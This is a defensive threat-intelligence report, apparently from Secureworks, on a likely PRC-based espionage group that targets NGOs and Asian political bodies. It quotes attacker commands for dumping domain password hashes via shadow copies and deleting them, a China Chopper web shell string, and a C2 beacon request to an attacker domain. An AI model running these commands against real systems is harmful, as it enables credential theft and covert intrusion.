BRONZE PRESIDENT Targets NGOs
secureworks.com/research/bronze-president-targets-ngos

Summary
The activities of some non-governmental organizations (NGOs) challenge governments on
politically sensitive issues such as social, humanitarian, and environmental policies. As a result,
these organizations are often exposed to increased government-directed threats aimed at
monitoring their activities, discrediting their work, or stealing their intellectual property. BRONZE
PRESIDENT is a likely People's Republic of China (PRC)-based targeted cyberespionage group
that uses both proprietary and publicly available tools to target NGO networks. Secureworks®
Counter Threat Unit™ (CTU) researchers have observed BRONZE PRESIDENT activity since
mid-2018 but identiﬁed artifacts suggesting that the threat actors may have been conducting
network intrusions as far back as 2014.
CTU™ researchers divided the threat intelligence about this threat group into two sections:
strategic and tactical. Executives can use the strategic assessment of the ongoing threat to
determine how to reduce risk to their organization's mission and critical assets. Computer network
defenders can use the tactical information gathered from incident response investigations and
research to reduce the time and effort associated with responding to the threat group's activities.

Key points
The BRONZE PRESIDENT cyberespionage group targets NGOs, as well as political and
law enforcement organizations in countries in South and East Asia.
The threat group appears to have developed its own remote access tools that it uses
alongside publicly available remote access and post-compromise toolsets.
After compromising a network, the threat actors elevate their privileges and install malware
on a large proportion of systems. The group runs custom batch scripts to collect speciﬁc ﬁle
types and takes proactive steps to minimize detection of its activities.

Strategic threat intelligence
Analysis of a threat group's targeting, origin, and competencies can determine which
organizations could be at risk. This information can help organizations make strategic defensive
decisions in relation to the BRONZE PRESIDENT threat group.

Intent
CTU researchers have observed BRONZE PRESIDENT targeting multiple NGOs. The threat
actors steal data from compromised systems over a long period of time, which likely indicates a
long-term objective of monitoring the target's network. BRONZE PRESIDENT uses custom batch
scripts to collect either speciﬁc ﬁle types (including ﬁles with .pptx, .xlsx, .pdf extensions) or all

ﬁles within a speciﬁc location. CTU researchers also observed evidence that the threat actors
collect credentials from high-privilege network accounts and reputationally sensitive accounts,
such as social media and webmail accounts.
Additionally, CTU researchers have observed evidence of BRONZE PRESIDENT targeting
political and law enforcement organizations in countries adjacent to the PRC, including Mongolia
and India. Some of the group's phishing lures suggest an interest in national security,
humanitarian, and law enforcement organizations in the East, South, and Southeast Asia (see
Figure 1). These examples reveal BRONZE PRESIDENT's likely intent to conduct political
espionage in other countries in addition to targeting NGOs.

Attribution
It is highly likely that BRONZE PRESIDENT is based in the PRC due to the following
observations:

BRONZE PRESIDENT Targets NGOs | Secureworks

The NGOs targeted by BRONZE PRESIDENT conduct research on issues relevant to the
PRC.
Strong evidence links BRONZE PRESIDENT's infrastructure to entities within the PRC.
There are connections between a subset of the group's operational infrastructure and PRCbased Internet service providers.
Tools such as PlugX have historically been leveraged by threat groups operating in the
PRC.

It is likely that BRONZE PRESIDENT is sponsored or at least tolerated by the PRC government.
The threat group's systemic long-term targeting of NGO and political networks does not align with
patriotic or criminal threat groups.

Capability
BRONZE PRESIDENT has deployed a variety of remote access tools. The use of tools not
previously observed by CTU researchers suggests that the group could have access to malware
development capabilities. BRONZE PRESIDENT also uses widely available or modiﬁed opensource tools, which could be a strategic effort to reduce the risk of attribution or to minimize the
need for tool development resources. Following a network compromise, the threat actors typically
delete their tools and processes. However, the group is content leaving some malware on the
network, likely to provide a contingency if other access channels are removed. When the group's
activities were detected in one incident, it had elevated privileges and had maintained access to
the targeted environment for several months. This ﬁnding indicates the group's effectiveness at
maintaining long-term access to a targeted network.

Tactical threat intelligence
Incident response engagements have given CTU researchers insight into the threat group's tools
and tactics.

Tools
CTU researchers and Secureworks incident responders have observed BRONZE PRESIDENT
using the following tools, along with several custom batch scripts for locating and archiving
speciﬁc ﬁle types:
Cobalt Strike — This popular and commercially available penetration tool gains shell
access to an infected system. It allows threat actors to execute additional tools and perform
post-intrusion actions on compromised systems. Cobalt Strike appears to be one of
BRONZE PRESIDENT's preferred remote access tools. During one intrusion, the threat
actors installed it on over 70% of accessible hosts. The group's Cobalt Strike installation
typically uses a payload named svchost.exe in an attempt to disguise Cobalt Strike activity
as the legitimate Windows svchost.exe executable.

https://www.secureworks.com/research/bronze-president-targets-ngos

PlugX — This remote access trojan (RAT) is popular among PRC-based targeted threat
groups. Its functionality includes uploading and downloading ﬁles, and it has conﬁgurable
network protocols. BRONZE PRESIDENT installs PlugX using DLL side-loading. In June
and August 2019, BRONZE PRESIDENT delivered PlugX via government and law
enforcement-themed phishing lures.
ORat — CTU researchers have only observed this basic loader tool in the context of
BRONZE PRESIDENT intrusions. ORat is the name assigned by the malware author, as
denoted by the program debug database string in the analyzed sample:
D:\vswork\Plugin\ORat\build\Release\ORatServer\Loader.pdb. The tool uses the Windows
Management Instrumentation (WMI) event consumer for persistence by installing a script to
the system's WMI registry. Messages sent from ORat to its command and control (C2)
server start with the string "VIEWS0018x". If the data received from the C2 server starts
with the same string, then the remainder of the payload is decompressed using ORat's
"deﬂate" algorithm and called as a function. ORat acts as a ﬂexible loader tool rather than a
fully featured remote access tool.
RCSession — This basic RAT is installed via DLL side-loading, and CTU researchers
observed BRONZE PRESIDENT installing it on multiple hosts during intrusions. RCSession
was extracted from a ﬁle called English.rtf and launched via a hollowed svchost.exe
process. RCSession connects to its C2 server via a custom protocol, can remotely execute
commands, and can launch additional tools. CTU researchers have no evidence of other
threat actors using RCSession or of wide proliferation of the tool, suggesting it may be
exclusively used by BRONZE PRESIDENT.
Nbtscan — This publicly available command-line tool scans systems for NetBIOS name
information (see Figure 2). In an example observed by CTU researchers, the Nbtscan
executable was named Adobe.exe and was installed in several working directories on
compromised hosts, including: C:\Recovery\.

Nmap — BRONZE PRESIDENT used this freely available network scanning tool from the
C:\PerfLogs\ folder.
Wmiexec — This publicly available tool uses WMI to create SYSTEM-level shells on
remote hosts.

Links to other malware
While analyzing hosts compromised by BRONZE PRESIDENT, CTU researchers identiﬁed other
malware artifacts. Although there was no evidence of the group using the malware, the threat
actors may have leveraged its access or capabilities during earlier phases of the intrusions. The

BRONZE PRESIDENT Targets NGOs | Secureworks

BRONZE PRESIDENT intrusions observed by CTU researchers appear to have taken place over
several months or years.
China Chopper web shell ﬁles named error404.aspx included the
"eval(Request.Item["|"],"unsafe");" string. To successfully interact with the web shell, a threat actor
sent HTTP requests that included the "|" parameter. The web shell ﬁles appeared to be installed
during the timeframe that BRONZE PRESIDENT was active on the system (see Figure 3).

Figure 3. Timeline of malicious tool use on a compromised host. (Source: Secureworks)
CTU researchers identiﬁed a variety of post-compromise tools stored under %AppData% (e.g.,
\AppData\Roaming\Temp) on several compromised systems. The widespread proliferation and
use of the following tools suggest that the group likely has the knowledge and capability to use
them as part of its operations:
Powerview.ps1 — This PowerShell-based module for network reconnaissance is part of the
PowerSploit penetration testing framework.
PVE Find AD User — This command-line tool identiﬁes login locations of Active Directory
(AD) users.
AdFind — This command-line tool conducts AD queries.
NetSess — This publicly available tool enumerates NetBIOS sessions.
Netview — This tool enumerates networks.
TeamViewer — This remote control and desktop-sharing tool has applications for legitimate
and malicious system users. Its installation in a temporary directory alongside network
reconnaissance and enumeration tools likely indicates malicious intent.

Initial access and working directories
At the time of detection, observed BRONZE PRESIDENT incidents had likely been ongoing for
several months or even years. As a result, CTU researchers were unable to ascertain the initial
access vector. In October 2019, third-party researchers described a phishing campaign that used

https://www.secureworks.com/research/bronze-president-targets-ngos

5/14

BRONZE PRESIDENT Targets NGOs | Secureworks

C2 infrastructure that CTU researchers attribute to BRONZE PRESIDENT. This connection
suggests that the group uses phishing emails with ZIP attachments that contain LNK ﬁles as an
initial access vector.
During one intrusion, the threat actors gained administrator access to all systems within a
targeted business unit and installed their remote access tools on 80% of the hosts. The group
installed multiple tools within the environment, including three different tools on a strategically
important server, likely to provide contingency access options (see Table 1).

During multiple intrusions, the threat actors employed various tools and techniques to understand
the network environments. For example, they used Nmap to scan various internal IP address
ranges and SMB ports (see Figure 4). They also relied on Nbtscan, net user, and ping commands
to obtain insights and identify opportunities for lateral movement.

Figure 4. Nmap network scanning tool use via RCSession. (Source: Secureworks)
BRONZE PRESIDENT regularly leverages Wmiexec to move laterally. During one intrusion, the
threat actors extensively used this tool to execute WMI commands on remote hosts in the
environment (see Figure 5).

Figure 5. Wmiexec used to execute commands on a targeted host. (Source: Secureworks)
They also frequently leverage net commands to connect to other hosts (see Figure 6) using
compromised credentials collected during early phases of the intrusion.

Figure 6. BRONZE PRESIDENT Nbtscan use and net commands. (Source: Secureworks)
During one intrusion observed by CTU researchers, the group used the native vssadmin tool on a
domain controller to create a volume shadow copy:
vssadmin create shadow /for=c:

The threat actors retrieved the NTDS.dit ﬁle from the volume shadow copy. NTDS.dit contains
Active Directory data, including password hashes for all users on a domain. Extracting hashes
from the NTDS.dit ﬁle requires access to the SYSTEM ﬁle in the system registry:
reg save hklm\system c:\windows\temp\system.hive

https://www.secureworks.com/research/bronze-president-targets-ngos

The threat actors saved both the SYSTEM ﬁle (system.hive) and NTDS.dit in the compromised
host's c:\windows\temp directory. These ﬁles were likely exﬁltrated and exploited ofﬂine to retrieve
user password hashes, which could then be cracked or used to perform pass-the-hash attacks.

C2 communications and infrastructure
BRONZE PRESIDENT's C2 techniques are dictated by its remote access tools. The group's
primary and likely proprietary RCSession RAT communicates with a hard-coded C2 server using
a custom protocol over TCP port 443. After connecting to its C2 server, RCSession checks in with
an encrypted beacon and then awaits instruction. The ORat tool, which appears to be used less
frequently by the group, communicates over TCP port 80 using a raw socket protocol (not HTTP).
The Cobalt Strike tool has malleable C2 proﬁles. During one intrusion, it connected to multiple C2
domains on TCP port 80, including mail . svrchost . com, using the following request. Subsequent
Cobalt Strike C2 servers included subdomains of svchosts . com, svrchost . com, and strust .
club.
GET /Dv9i HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
Host: mail . svrchost . com
Connection: Keep-Alive
Cache-Control: no-cache

Some BRONZE PRESIDENT C2 domains analyzed by CTU researchers were hosted on
infrastructure owned by Dutch VPS provider Host Sailor, Hong Kong-based New World Telecoms,
and Malaysia-based Shinjiru Technology (see Figure 7). The threat actors have used discrete
infrastructure clusters that share matching hosting and registration characteristics. The pattern of
infrastructure hosting suggests that the group parks its domains when not in use, an operational
security technique that limits exposure of the group's overall hosting infrastructure.

Persistence, defensive evasion, and exﬁltration
Some of BRONZE PRESIDENT's malware has persistence capabilities. For example, ORat uses
a WMI event consumer to maintain its presence on a compromised host. The group also creates
and maintains scheduled tasks to achieve this purpose. Figure 8 shows a Sysdriver scheduled
task that periodically executes a Cobalt Strike payload.

Figure 8. BRONZE PRESIDENT scheduled task created for Cobalt Strike persistence. (Source:
Secureworks)
The threat actors tend to install malware on a large proportion of hosts during their intrusions.
However, the group exercises restraint and defensive evasion tactics to minimize opportunities for
network defenders to detect or investigate its activities. For example, the threat actors deleted
volume shadow copies after using them for NTDS.dit retrieval:
vssadmin delete shadows /for=c: /quiet

Likewise, the group demonstrated diligence by killing local and remote processes after they had
been used:
taskkill /im svchosts.exe /F
taskkill /S <REMOTE SYSTEM NAME> /U <USERNAME> /P <PASSWORD> /im svchost.exe

BRONZE PRESIDENT targets speciﬁc data types. The threat actors use custom batch scripts to
create a list of ﬁles with predeﬁned criteria and collate the identiﬁed ﬁles into a .rar archive (see
Figure 9). CTU researchers have observed BRONZE PRESIDENT batch scripts named doc.bat,
xls.bat, xlsx.bat, ppt.bat, pptx.bat, pdf.bat, and txt.bat.

Figure 9. Batch script (pptx.bat) used to collate and archive all .pptx ﬁles in a deﬁned location.
(Source: Secureworks)
The group also uses the all.bat batch script to collect all ﬁles stored on a speciﬁc user's desktop.
CTU researchers observed RCSession and Cobalt Strike on systems that BRONZE PRESIDENT
targeted for data theft. Either of these tools could have been used to exﬁltrate the archived data.

Conclusion
BRONZE PRESIDENT has demonstrated intent to steal data from organizations using tools such
as Cobalt Strike, PlugX, ORat, and RCSession. The concurrent use of so many tools during a
single intrusion suggests that the group could include threat actors with distinct tactics, roles, and
tool preferences. It is likely that BRONZE PRESIDENT has additional unobserved operational
tools and capabilities. CTU researchers recommend that organizations apply controls to mitigate
common intrusion techniques and behaviors along with controls that address the tools and
techniques discussed in this analysis.
